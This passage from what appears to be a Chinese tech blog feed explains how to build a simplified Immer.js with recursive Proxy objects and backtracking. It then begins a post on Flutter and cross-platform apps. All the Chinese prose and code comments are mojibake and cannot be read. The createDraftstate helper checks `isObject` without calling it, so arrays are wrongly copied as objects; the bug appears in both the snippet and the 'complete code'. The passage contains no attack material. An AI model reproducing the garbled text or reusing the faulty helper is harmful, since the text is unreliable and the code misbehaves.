é€šè¿‡ç›´è§‚çš„æ“ä½œä¿®æ”¹æ•°æ®ï¼Œå¾—åˆ°ä¸€ä¸ªæ‹·è´å¯¹è±¡ï¼ˆè¿™ä¸ªå‰¯æœ¬åªæ–°å»ºè¢«æ”¹å˜çš„å˜é‡, å…¶ä½™å˜é‡éƒ½å¤ç”¨ï¼‰</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * produceæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¼ å…¥è¦æ‹·è´çš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * produceæ–¹æ³•çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºå‡½æ•°, é‡Œé¢æ˜¯draftï¼Œå¯¹ä¼ å…¥å¯¹è±¡çš„ä¿®æ”¹æ“ä½œ</span></span><br><span class="line"><span class="comment"> * æœ€åè¿”å›ä¸€ä¸ªå¤åˆ¶å®Œæ¯•çš„å¯¹è±¡</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> obj2 = immer.produce(obj1, (draft) =&gt; &#123;</span><br><span class="line">  draft.name.basename[<span class="string">'2022'</span>] = <span class="string">'ä¿®æ”¹name'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br><br><br></p><h4 id="3-3-å®ç°ä¸€ä¸ªç®€æ˜“çš„Immer-js"><a href="#3-3-å®ç°ä¸€ä¸ªç®€æ˜“çš„Immer-js" class="headerlink" title="3.3 å®ç°ä¸€ä¸ªç®€æ˜“çš„Immer.js"></a>3.3 å®ç°ä¸€ä¸ªç®€æ˜“çš„Immer.js</h4><p>Immer.js é€šè¿‡é€’å½’å¼çš„ proxy ä»£ç†å’Œæµ…æ‹·è´ï¼Œå……åˆ†å¤ç”¨æ•°æ®ç»“æ„ä¸­ä¸å˜çš„èŠ‚ç‚¹ï¼ŒåŒæ—¶æ»¡è¶³æ€§èƒ½è¦æ±‚ å’Œ ä¸å¯å˜æ•°æ®çš„è¦æ±‚ã€‚</p><h5 id="3-3-1-åŸºæœ¬çš„å·¥å…·æ–¹æ³•"><a href="#3-3-1-åŸºæœ¬çš„å·¥å…·æ–¹æ³•" class="headerlink" title="3.3.1 åŸºæœ¬çš„å·¥å…·æ–¹æ³•"></a>3.3.1 åŸºæœ¬çš„å·¥å…·æ–¹æ³•</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isObject = <span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">Object</span>.prototype.toString.call(val) === <span class="string">'[object Object]'</span>;</span><br><span class="line"><span class="keyword">const</span> isArray = <span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">Object</span>.prototype.toString.call(val) === <span class="string">'[object Array]'</span>;</span><br><span class="line"><span class="keyword">const</span> isFunction = <span class="function">(<span class="params">val</span>) =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">'function'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ…æ‹·è´</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createDraftstate</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (isObject) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;, target)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isArray(target)) &#123;</span><br><span class="line">    <span class="keyword">return</span> [...target]</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h5 id="3-3-2-å…¥å£æ–¹æ³•"><a href="#3-3-2-å…¥å£æ–¹æ³•" class="headerlink" title="3.3.2 å…¥å£æ–¹æ³•"></a>3.3.2 å…¥å£æ–¹æ³•</h5><p>ä¼ å…¥<code>target</code>éœ€è¦è¢«æ‹·è´çš„å¯¹è±¡ï¼Œ <code>producer</code>ä¿®æ”¹æ“ä½œï¼Œæœ€åè¿”å›æ‹·è´ + ä¿®æ”¹åçš„å¯¹è±¡ï¼ˆè¿˜ä¸ä¼šå‡ºç°å¤šå±‚proxyï¼‰<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">produce</span>(<span class="params">target, producer</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> proxyState = createProxy(target) <span class="comment">// åˆ›å»ºproxy</span></span><br><span class="line">  producer(proxyState) <span class="comment">// ä¿®æ”¹æ•°æ®</span></span><br><span class="line">  <span class="keyword">return</span> proxyState</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h5 id="3-3-3-æ ¸å¿ƒä»£ç†æ–¹æ³•"><a href="#3-3-3-æ ¸å¿ƒä»£ç†æ–¹æ³•" class="headerlink" title="3.3.3 æ ¸å¿ƒä»£ç†æ–¹æ³•"></a>3.3.3 æ ¸å¿ƒä»£ç†æ–¹æ³•</h5><p>ä¸ç®¡å¤„äºå¯¹è±¡çš„å“ªä¸€å±‚ï¼ŒImmer.js ç»™è®¿é—®åˆ°çš„keyéƒ½è½¬åŒ–ä¸ºä¸€ä¸ªproxyå¯¹è±¡ã€‚è¯¥ä»£ç†å¯¹è±¡èƒ½å¤Ÿè·Ÿè¸ªå¯¹è±¡å±æ€§çš„è¯»å–å’Œä¿®æ”¹æ“ä½œã€‚å½“å¯¹è±¡çš„å±æ€§è¢«è¯»å–æ—¶ï¼Œä¼šå°†è¯¥å±æ€§å€¼ä¹Ÿè½¬æ¢ä¸ºä»£ç†å¯¹è±¡ï¼›å½“å±æ€§è¢«ä¿®æ”¹æ—¶ï¼Œä¼šæ ‡è®°å¯¹è±¡å·²è¢«ä¿®æ”¹ï¼Œå¹¶æ›´æ–°å†…éƒ¨çš„è‰ç¨¿çŠ¶æ€ã€‚</p><p>æ¯ä¸ªè®¿é—®åˆ°çš„keyéƒ½ç»´æŠ¤ç€ä¸€ä¸ªinternalå¯¹è±¡ã€‚æ¯”å¦‚obj2.nameä¼šç”Ÿæˆä¸€ä¸ªè‡ªå·±çš„internal, obj2.name.nicknameä¹Ÿä¼šç”Ÿæˆä¸€ä¸ªè‡ªå·±çš„internalã€‚internalå¯¹è±¡è¯¦ç»†çš„è®°å½•ç€å®ƒçš„åŸå§‹å€¼ã€æµ…æ‹·è´ç‰ˆæœ¬ã€æ‰€æœ‰ä¿®æ”¹éƒ½ä¼šåœ¨æµ…æ‹·è´ç‰ˆæœ¬ä¸Šæ“ä½œã€‚</p><p>å¤§è‡´æµç¨‹ï¼š</p><ol><li>å…ˆç»™æœ€å¤–å±‚å¯¹è±¡è½¬æ¢ä¸ºä¸€ä¸ªproxyå¯¹è±¡</li><li>å¯¹è±¡ä¸­æŸä¸ªçš„keyè¢«è¯»å–ï¼Œä¼šè§¦å‘ get æ–¹æ³•ï¼Œimmerjsä¼šæŠŠè¯»å–åˆ°çš„keyè½¬åŒ–ä¸ºä¸€ä¸ªproxyå¯¹è±¡ã€‚</li><li>æ¯ä¸ªproxyä¼šç»´æŠ¤å½“å‰è¿™ä¸ªkeyçš„å€¼çš„æµ…æ‹·è´ç‰ˆæœ¬<code>draftState</code></li><li>å½“setçš„æ—¶å€™ï¼Œä¼šè¿”å›<code>draftState[key] = value</code></li><li>æœ€ç»ˆé€å±‚è¿”å› <code>changed ? draftState[key] : targetState[key]</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toProxy</span>(<span class="params">targetState</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> internal = &#123;</span><br><span class="line">    targetState, <span class="comment">// åŸå§‹å¯¹è±¡</span></span><br><span class="line">    keyToProxy: &#123;&#125;, <span class="comment">// è®°å½•äº†å“ªäº›keyè¢«è¯»å–äº†(æ³¨æ„ä¸æ˜¯ä¿®æ”¹äº†)ï¼Œä»¥åŠkeyå¯¹åº”çš„proxy</span></span><br><span class="line">    changed: <span class="literal">false</span>, <span class="comment">// æ ‡è®°æ˜¯å¦è¢«ä¿®æ”¹</span></span><br><span class="line">    draftstate: createDraftstate(targetState), <span class="comment">// å½“å‰è¿™ä¸€ç¯çš„keyçš„æµ…æ‹·è´ç‰ˆæœ¬</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(targetState, &#123;</span><br><span class="line">    get(_, key) &#123;</span><br><span class="line">      <span class="keyword">if</span> (key === INTERNAL) <span class="keyword">return</span> internal</span><br><span class="line">      <span class="keyword">const</span> val = targetState[key];</span><br><span class="line">      <span class="comment">// åªè¦keyè¢«è¯»å–äº†ï¼Œå°±æŠŠå®ƒæ›¿æ¢ä¸ºä¸€ä¸ªproxyå¯¹è±¡</span></span><br><span class="line">      <span class="keyword">if</span> (!(key <span class="keyword">in</span> internal.keyToProxy)) &#123;</span><br><span class="line">        internal.keyToProxy[key] = toProxy(val)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> internal.keyToProxy[key]</span><br><span class="line">  &#125;,</span><br><span class="line">  set(_, key, value) &#123;</span><br><span class="line">    internal.changed = <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// æœ€ç»ˆçš„æ‹·è´å¯¹è±¡å…¶å®æ˜¯ç”±æ‰€æœ‰draftstateç»„æˆ</span></span><br><span class="line">    internal.draftstate[key] = value</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)&#125;</span><br></pre></td></tr></table></figure></li></ol><p><br></p><h5 id="3-3-4-ä¿®æ”¹é“¾å›æº¯"><a href="#3-3-4-ä¿®æ”¹é“¾å›æº¯" class="headerlink" title="3.3.4 ä¿®æ”¹é“¾å›æº¯"></a>3.3.4 ä¿®æ”¹é“¾å›æº¯</h5><p>ä¸Šé¢çš„ä»£ç åªå®Œæˆäº†å‰4æ­¥ï¼Œæˆ‘ä»¬è¿˜æ²¡è®©ä¿®æ”¹åçš„å€¼<code>draftState</code>è¿”å›å‡ºæ¥ã€‚</p><p>å½“æˆ‘ä»¬ä¿®æ”¹äº†ä¸€ä¸ªå€¼å¦‚<code>obj1.name.basename[2022]</code>, è¿å¸¦è¿™ä¸ªå€¼çš„çˆ¶çº§ä¹Ÿè¦è¢«ä¿®æ”¹, çˆ¶çº§è¢«ä¿®æ”¹åˆ™çˆ¶çº§çš„çˆ¶çº§ä¹Ÿè¦è¢«ä¿®æ”¹, å½¢æˆäº†ä¸€ä¸ªä¿®æ”¹é“¾, æˆ‘ä»¬è¦åŠ å…¥å›æº¯ç®—æ³•è¿›è¡Œé€çº§çš„ä¿®æ”¹ã€‚å¹¶ç¡®ä¿ä¿®æ”¹è¿‡çš„æ•´ä¸ªè·¯å¾„éƒ½æ˜¯<code>draftState[key]</code>ï¼Œè€Œä¸æ˜¯ä»¥ä¸€ä¸ªProxyå¥—å¨ƒã€‚</p><p><img src="/2025/03/17/immerjs/1.jpeg" style="display: inline-block; width: 33%"><img src="/2025/03/17/immerjs/2.jpeg" style="display: inline-block; width: 33%"><img src="/2025/03/17/immerjs/3.png" style="display: inline-block; width: 33%"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ›´æ–° toProxy æ–¹æ³•</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toProxy</span>(<span class="params">targetState, backTracking = (</span>) =&gt; </span>&#123; &#125;) &#123;</span><br><span class="line">  <span class="keyword">let</span> internal = &#123;</span><br><span class="line">    targetState, <span class="comment">// åŸå§‹å¯¹è±¡</span></span><br><span class="line">    keyToProxy: &#123;&#125;, <span class="comment">// è®°å½•äº†å“ªäº›keyè¢«è¯»å–äº†(æ³¨æ„ä¸æ˜¯ä¿®æ”¹äº†)ï¼Œä»¥åŠkeyå¯¹åº”çš„proxy</span></span><br><span class="line">    changed: <span class="literal">false</span>, <span class="comment">// æ ‡è®°æ˜¯å¦è¢«ä¿®æ”¹</span></span><br><span class="line">    draftstate: createDraftstate(targetState), <span class="comment">// å½“å‰è¿™ä¸€ç¯çš„keyçš„æµ…æ‹·è´ç‰ˆæœ¬</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(targetState, &#123;</span><br><span class="line">    get(_, key) &#123;</span><br><span class="line">      <span class="keyword">if</span> (key === INTERNAL) <span class="keyword">return</span> internal</span><br><span class="line">      <span class="keyword">const</span> val = targetState[key];</span><br><span class="line">      <span class="comment">// åªè¦keyè¢«è¯»å–äº†ï¼Œå°±æŠŠå®ƒæ›¿æ¢ä¸ºä¸€ä¸ªproxyå¯¹è±¡</span></span><br><span class="line">      <span class="keyword">if</span> (!(key <span class="keyword">in</span> internal.keyToProxy)) &#123;</span><br><span class="line">        internal.keyToProxy[key] = toProxy(val, () =&gt; &#123;</span><br><span class="line">          internal.changed = <span class="literal">true</span>;</span><br><span class="line">          <span class="keyword">const</span> proxyObj = internal.keyToProxy[key];</span><br><span class="line">          <span class="comment">// å°†ä¿®æ”¹åçš„å€¼èµ‹ç»™è‡ªå·±</span></span><br><span class="line">          internal.draftstate[key] = proxyObj[INTERNAL].draftstate;</span><br><span class="line">          backTracking()</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> internal.keyToProxy[key]</span><br><span class="line">    &#125;,</span><br><span class="line">    set(_, key, value) &#123;</span><br><span class="line">      internal.changed = <span class="literal">true</span>;</span><br><span class="line">      <span class="comment">// æœ€ç»ˆçš„æ‹·è´å¯¹è±¡å…¶å®æ˜¯ç”±æ‰€æœ‰draftstateç»„æˆ</span></span><br><span class="line">      internal.draftstate[key] = value</span><br><span class="line">      backTracking()</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚ä½•ç†è§£<code>backTracking</code>ï¼Ÿå‡è®¾æˆ‘ä»¬åªåšè¿™ä¸ªæ“ä½œ<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> a = &#123;</span><br><span class="line">  b: &#123;</span><br><span class="line">    c: &#123;</span><br><span class="line">      d: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> newState = produce(a, <span class="function"><span class="keyword">function</span> (<span class="params">draft</span>) </span>&#123;</span><br><span class="line">  draft.b.c.d = <span class="number">2</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>ä¼šç»è¿‡è¿™ä¹ˆå‡ ä¸ªæ­¥éª¤</p><ul><li>å°† a è½¬æ¢ä¸º proxy</li><li>è§¦å‘äº† a.b çš„ getï¼Œå°† a.b è½¬æ¢ä¸º proxy</li><li>è§¦å‘äº† a.b.c çš„ get, å°† a.b.c è½¬æ¢ä¸º proxy</li><li>è§¦å‘äº† a.b.c.d çš„ set</li><li>è¿™ä¸ª set åŒæ—¶æ‰§è¡Œäº† backTracking, ä»¤ b.draftState.c = { d: 2 }</li><li>è¿™ä¸ª backTraking åˆæ‰§è¡Œäº†å†ä¸Šä¸€å±‚çš„ backTraking, ä»¤ a.draftState.b = { c: { d: 2 }}</li><li>æœ€åè¿”å›äº† a.draftStateï¼Œå®Œæˆäº†ä¿®æ”¹é“¾çš„é€çº§ä¿®æ”¹</li></ul><p><br></p><h5 id="3-3-5-å®Œæ•´ä»£ç "><a href="#3-3-5-å®Œæ•´ä»£ç " class="headerlink" title="3.3.5 å®Œæ•´ä»£ç "></a>3.3.5 å®Œæ•´ä»£ç </h5><p>å¯ä»¥ç›´æ¥æ”¾å…¥æµè§ˆå™¨è¯•è¯•æ•ˆæœ<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> isObject = <span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">Object</span>.prototype.toString.call(val) === <span class="string">'[object Object]'</span>;</span><br><span class="line"><span class="keyword">const</span> isArray = <span class="function">(<span class="params">val</span>) =&gt;</span> <span class="built_in">Object</span>.prototype.toString.call(val) === <span class="string">'[object Array]'</span>;</span><br><span class="line"><span class="keyword">const</span> isFunction = <span class="function">(<span class="params">val</span>) =&gt;</span> <span class="keyword">typeof</span> val === <span class="string">'function'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æµ…æ‹·è´</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createDraftstate</span>(<span class="params">target</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (isObject) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Object</span>.assign(&#123;&#125;, target)</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isArray(target)) &#123;</span><br><span class="line">    <span class="keyword">return</span> [...target]</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> target</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> INTERNAL = <span class="built_in">Symbol</span>(<span class="string">'internal'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">produce</span>(<span class="params">targetState, producer</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> proxyState = toProxy(targetState)</span><br><span class="line">  producer(proxyState);</span><br><span class="line">  <span class="keyword">const</span> internal = proxyState[INTERNAL];</span><br><span class="line">  <span class="keyword">return</span> internal.changed ? internal.draftstate : internal.targetState</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toProxy</span>(<span class="params">targetState, backTracking = (</span>) =&gt; </span>&#123; &#125;) &#123;</span><br><span class="line">  <span class="keyword">let</span> internal = &#123;</span><br><span class="line">    targetState, <span class="comment">// åŸå§‹å¯¹è±¡</span></span><br><span class="line">    keyToProxy: &#123;&#125;, <span class="comment">// è®°å½•äº†å“ªäº›keyè¢«è¯»å–äº†(æ³¨æ„ä¸æ˜¯ä¿®æ”¹äº†)ï¼Œä»¥åŠkeyå¯¹åº”çš„proxy</span></span><br><span class="line">    changed: <span class="literal">false</span>, <span class="comment">// æ ‡è®°æ˜¯å¦è¢«ä¿®æ”¹</span></span><br><span class="line">    draftstate: createDraftstate(targetState), <span class="comment">// å½“å‰è¿™ä¸€ç¯çš„keyçš„æµ…æ‹·è´ç‰ˆæœ¬</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(targetState, &#123;</span><br><span class="line">    get(_, key) &#123;</span><br><span class="line">      <span class="keyword">if</span> (key === INTERNAL) <span class="keyword">return</span> internal</span><br><span class="line">      <span class="keyword">const</span> val = targetState[key];</span><br><span class="line">      <span class="comment">// åªè¦keyè¢«è¯»å–äº†ï¼Œå°±æŠŠå®ƒæ›¿æ¢ä¸ºä¸€ä¸ªproxyå¯¹è±¡</span></span><br><span class="line">      <span class="keyword">if</span> (!(key <span class="keyword">in</span> internal.keyToProxy)) &#123;</span><br><span class="line">        internal.keyToProxy[key] = toProxy(val, () =&gt; &#123;</span><br><span class="line">          internal.changed = <span class="literal">true</span>;</span><br><span class="line">          <span class="keyword">const</span> proxyObj = internal.keyToProxy[key];</span><br><span class="line">          <span class="comment">// å°†ä¿®æ”¹åçš„å€¼èµ‹ç»™è‡ªå·±</span></span><br><span class="line">          internal.draftstate[key] = proxyObj[INTERNAL].draftstate;</span><br><span class="line">          backTracking()</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> internal.keyToProxy[key]</span><br><span class="line">    &#125;,</span><br><span class="line">    set(_, key, value) &#123;</span><br><span class="line">      internal.changed = <span class="literal">true</span>;</span><br><span class="line">      <span class="comment">// æœ€ç»ˆçš„æ‹·è´å¯¹è±¡å…¶å®æ˜¯ç”±æ‰€æœ‰draftstateç»„æˆ</span></span><br><span class="line">      internal.draftstate[key] = value</span><br><span class="line">      backTracking()</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> originalState = &#123;</span><br><span class="line">  name: <span class="string">'John'</span>,</span><br><span class="line">  age: <span class="number">30</span>,</span><br><span class="line">  locate: &#123;</span><br><span class="line">    address: <span class="number">1</span>,</span><br><span class="line">    arr: [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> newState = produce(originalState, <span class="function"><span class="keyword">function</span> (<span class="params">draft</span>) </span>&#123;</span><br><span class="line">  draft.age = <span class="number">31</span>; <span class="comment">// æ³¨æ„setä¸ä¼šè§¦å‘get</span></span><br><span class="line">  draft.locate.address = <span class="number">2</span>;</span><br><span class="line">  draft.locate.arr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// delete draft.name; è¿™ä¸ªè¿˜æ²¡å®ç°</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Original State:'</span>, originalState);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'New State:'</span>, newState);</span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://github.com/febobo/web-interview/issues/56" target="_blank" rel="noopener">æ·±æ‹·è´æµ…æ‹·è´çš„åŒºåˆ«ï¼Ÿå¦‚ä½•å®ç°ä¸€ä¸ªæ·±æ‹·è´ï¼Ÿ</a></li><li><a href="https://juejin.cn/post/7200669128289501239" target="_blank" rel="noopener">æ¯å¤©éƒ½åœ¨ç”¨ï¼Œä¹Ÿæ²¡æ•´æ˜ç™½çš„ React Hook</a></li><li><a href="https://www.zhihu.com/question/47746441/answer/107513878" target="_blank" rel="noopener">JavaScript å¦‚ä½•å®Œæ•´å®ç°æ·±åº¦Cloneå¯¹è±¡ï¼Ÿ</a></li><li><a href="https://segmentfault.com/a/1190000042282263" target="_blank" rel="noopener">è¯¦èŠimmer.jsé«˜æ•ˆå¤åˆ¶ä¸å†»ç»“â€å¯¹è±¡â€çš„åŸç†äºå±€é™æ€§</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Flutter è·¨ç«¯æŠ€æœ¯</title>
      <link href="/2025/03/17/%E8%B7%A8%E7%AB%AFflutter/"/>
      <url>/2025/03/17/%E8%B7%A8%E7%AB%AFflutter/</url>
      <content type="html"><![CDATA[<h3 id="1-å®¢æˆ·ç«¯æŠ€æœ¯"><a href="#1-å®¢æˆ·ç«¯æŠ€æœ¯" class="headerlink" title="1. å®¢æˆ·ç«¯æŠ€æœ¯"></a>1. å®¢æˆ·ç«¯æŠ€æœ¯</h3><h4 id="1-1-åŸç”Ÿ-Appï¼ˆnativeï¼‰"><a href="#1-1-åŸç”Ÿ-Appï¼ˆnativeï¼‰" class="headerlink" title="1.1 åŸç”Ÿ Appï¼ˆnativeï¼‰"></a>1.1 åŸç”Ÿ Appï¼ˆnativeï¼‰</h4><p>åŸç”ŸæŠ€æœ¯æ ˆæŒ‡çš„æ˜¯ï¼Œåªèƒ½ç”¨äºç‰¹å®šæ‰‹æœºå¹³å°çš„å¼€å‘æŠ€æœ¯ã€‚å…¸å‹ä»£è¡¨æ˜¯å®‰å“çš„ Javaï¼›iOS çš„ Object-Cã€Swift æŠ€æœ¯æ ˆï¼›windows pcç«¯çš„qt/c++; å®ƒä»¬éƒ½åªèƒ½ç”¨åœ¨ä¸€ä¸ªå¹³å°ï¼Œä¸èƒ½è·¨å¹³å°ã€‚</p><h4 id="2-æ··åˆ-App-ï¼ˆhybridï¼‰"><a href="#2-æ··åˆ-App-ï¼ˆhybridï¼‰" class="headerlink" title="2. æ··åˆ App ï¼ˆhybridï¼‰"></a>2. æ··åˆ App ï¼ˆhybridï¼‰</h4><p>å…¶å®æ˜¯ Web + å®¹å™¨,ä¹Ÿå°±æ˜¯æŠŠ Web ç½‘é¡µæ”¾åˆ°ç‰¹å®šçš„å®¹å™¨ä¸­ï¼Œç„¶åå†æ‰“åŒ…æˆå„ä¸ªå¹³å°çš„åŸç”Ÿ Appã€‚å…¸å‹ä»£è¡¨æ˜¯ Electronã€Ionic ç­‰æ¡†æ¶ã€‚</p><h4 id="3-è·¨å¹³å°-App-ï¼ˆcross-platformï¼‰"><a href="#3-è·¨å¹³å°-App-ï¼ˆcross-platformï¼‰" class="headerlink" title="3. è·¨å¹³å° App ï¼ˆcross-platformï¼‰"></a>3. è·¨å¹³å° App ï¼ˆcross-platformï¼‰</h4><p>ä½¿ç”¨ä¸€ç§æŠ€æœ¯ï¼ŒåŒæ—¶æ”¯æŒå¤šä¸ªå¹³å°ã€‚å®ƒä¸ä½¿ç”¨ Web æŠ€æœ¯ï¼Œå³å®ƒçš„é¡µé¢ä¸æ˜¯ HTML5 é¡µé¢ï¼Œè€Œæ˜¯ä½¿ç”¨è‡ªå·±çš„è¯­æ³•å†™çš„ UI 